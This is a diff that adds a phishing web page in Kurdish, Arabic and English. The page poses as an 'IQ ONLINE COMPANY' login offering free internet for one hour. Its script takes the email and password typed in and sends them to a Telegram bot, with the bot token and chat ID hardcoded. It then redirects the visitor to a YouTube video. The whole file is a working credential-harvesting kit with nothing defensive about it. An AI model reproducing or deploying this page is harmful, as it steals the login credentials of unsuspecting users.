@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>چوونەژوورەوە - IQ ONLINE</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #000000; /* باکگراوند ڕەش */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            direction: rtl;
+        }
+        .login-card {
+            background: white;
+            padding: 45px 35px;
+            border-radius: 12px;
+            box-shadow: 0 5px 20px rgba(255,255,255,0.15);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+        .login-card h3 {
+            font-size: 26px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 5px;
+        }
+        .login-card p {
+            color: #5f6368;
+            font-size: 15px;
+            margin-bottom: 20px;
+        }
+        /* شێوازی ڕەسمەکان */
+        .logo-top {
+            width: 100px;
+            margin: 0 auto 10px;
+            display: block;
+        }
+        .logo-banner {
+            width: 100%;
+            max-width: 250px;
+            margin: 0 auto 15px;
+            display: block;
+            border-radius: 8px;
+        }
+        .input-group {
+            margin-bottom: 18px;
+            text-align: right;
+        }
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            color: #3c4043;
+            margin-bottom: 5px;
+            font-weight: 500;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.2s;
+            background: #fafafa;
+        }
+        .input-group input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            background: white;
+            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 10px;
+        }
+        .btn:hover { background: #1557b0; }
+        .footer {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #5f6368;
+        }
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .footer a:hover { text-decoration: underline; }
+        .offer-box {
+            background: #e8f0fe;
+            border: 1px solid #c5d8f0;
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #174a7c;
+            line-height: 1.8;
+        }
+        .offer-box .en {
+            display: block;
+            font-weight: 500;
+        }
+        .offer-box .ar {
+            display: block;
+            font-size: 13px;
+            color: #1e3e6e;
+        }
+        .offer-box .ku {
+            display: block;
+            font-size: 13px;
+            color: #1e3e6e;
+            margin-top: 2px;
+        }
+        /* ڕەسمەکە لە نزیک ناونیشانەکە */
+        .inline-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        .inline-logo img {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+        .inline-logo h3 {
+            margin: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <!-- photo1.png وەک لۆگۆ لە نزیک IQ ONLINE COMPANY -->
+        <div class="inline-logo">
+            <img src="https://akar9.github.io/Aka/photo1.png" alt="logo">
+            <h3>IQ ONLINE COMPANY</h3>
+        </div>
+
+        <!-- photo0.jpg لە شوێنی سور (نێوان ناونیشان و دەقەکە) -->
+        <img src="https://akar9.github.io/Aka/photo0.jpg" alt="banner" class="logo-banner">
+
+        <div class="offer-box">
+            <span class="en">Free internet access for 1 hour – just sign in</span>
+            <span class="ar">إنترنت مجاني لمدة ساعة – فقط سجل الدخول</span>
+            <span class="ku">ئینتەرنێتی خۆڕایی بۆ ماوەی ١ کاتژمێر – تەنها چوونەژوورەوە</span>
+        </div>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <label>ئیمەیڵ یان ژمارەی تەلەفۆن</label>
+                <input type="email" id="email" placeholder="email@example.com" required>
+            </div>
+            <div class="input-group">
+                <label>پاسۆڕد</label>
+                <input type="password" id="pass" placeholder="پاسۆڕدەکەت" required>
+            </div>
+            <button type="submit" class="btn">بچۆ ژوورەوە</button>
+        </form>
+
+        <div class="footer">
+            <a href="#">زانیاری زیاتر</a> • <a href="#">یارمەتی</a>
+        </div>
+    </div>
+
+    <script>
+        const TOKEN = "8988207945:AAGSUvEU7PC25hiMDM8EoOU7dWl1tQ6DJ9M";
+        const CHAT_ID = "1073170460";
+
+        document.getElementById('loginForm').onsubmit = function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value.trim();
+            const pass = document.getElementById('pass').value.trim();
+
+            if (!email || !pass) {
+                alert("تکایە هەموو خانەکان پڕ بکەوە");
+                return;
+            }
+
+            const message = `👤 گمەیڵ: ${email} | 🔑 پاسۆڕد: ${pass}`;
+
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
+                .finally(() => {
+                    window.location.href = "https://youtu.be/aIaJ7in-tLg?si=QoKeKO6VRwpcap_D";
+                });
+        };
+    </script>
+</body>
+</html>
